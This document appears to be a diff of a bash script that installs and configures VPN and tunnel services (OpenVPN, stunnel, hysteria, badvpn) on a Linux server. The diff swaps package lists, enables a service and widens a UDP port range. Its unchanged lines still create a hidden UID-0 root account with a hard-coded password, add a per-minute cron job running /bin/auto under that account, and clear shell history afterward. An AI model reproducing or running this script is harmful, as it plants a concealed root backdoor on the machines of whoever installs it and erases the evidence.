@@ -1,5 +1,5 @@
 #!/bin/bash
-rm -rf test13*
+rm -rf test14*
 
 
 RED='\033[01;31m';
@@ -24,12 +24,9 @@ systempackages () {
 export DEBIAN_FRONTEND=noninteractive
 apt-get update
 apt-get upgrade -y
-apt install -y curl wget cron python-minimal libpython-stdlib
-apt install -y iptables
-apt install -y openvpn netcat httpie php neofetch vnstat
-apt install -y screen squid stunnel4 dropbear gnutls-bin python
-apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
-apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+apt-get install mysql-client openvpn unzip build-essential curl privoxy apache2 stunnel4 net-tools screen -y
+apt-get install php php-mysqli php-mysql php-gd php-mbstring -y
+apt-get install php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap -y
 }
 
 filesfolders () {
@@ -580,6 +577,7 @@ echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
+systemctl enable hysteria-server.service
 systemctl restart hysteria-server.service
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
@@ -617,7 +615,7 @@ INSTALL_BBR=true
 sysctl -p
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 iptables -F
-iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
+iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j MASQUERADE
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o ens3 -j MASQUERADE
@@ -642,6 +640,7 @@ systemctl start openvpn@server
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
 crontab -u dexterjakulero -r
 (crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u dexterjakulero
+
 }
 
 serviceenable () {
@@ -899,4 +898,4 @@ do
 done
 history -c
 history -w
-rm -rf test13
+rm -rf test14
